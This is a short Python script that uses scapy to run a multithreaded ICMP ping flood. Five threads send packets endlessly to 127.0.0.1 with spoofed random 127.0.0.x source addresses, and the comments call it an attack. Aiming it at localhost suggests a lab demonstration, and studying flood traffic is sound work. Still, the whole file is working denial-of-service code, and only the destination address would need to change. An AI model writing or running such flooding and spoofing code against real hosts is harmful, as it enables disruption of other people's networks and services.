from scapy.all import IP, ICMP, send
import random
import threading

# **************************************************************************************
# Function to generate a random IP address in the range 127.0.0.2 to 127.0.0.255.
# **************************************************************************************
def random_ip():
    return "127.0.0." + str(random.randint(2, 255))

# **************************************************************************************
# Function to continuously send ICMP packets (ping) to the localhost (127.0.0.1).
# This function will be executed by multiple threads to create a ping flood attack.
# **************************************************************************************
def ping_flood():
    while True:
        send(IP(src=random_ip(), dst="127.0.0.1") / ICMP(), loop=0, inter=0.01)

# **************************************************************************************
# Number of threads to be used for the ping flood attack.
# **************************************************************************************
num_threads = 5

# **************************************************************************************
# Create and start multiple threads for the ping flood attack.
# **************************************************************************************
threads = []
for i in range(num_threads):
    thread = threading.Thread(target=ping_flood)
    thread.start()
    threads.append(thread)

# **************************************************************************************
# Wait for all threads to finish.
# **************************************************************************************
for thread in threads:
    thread.join()
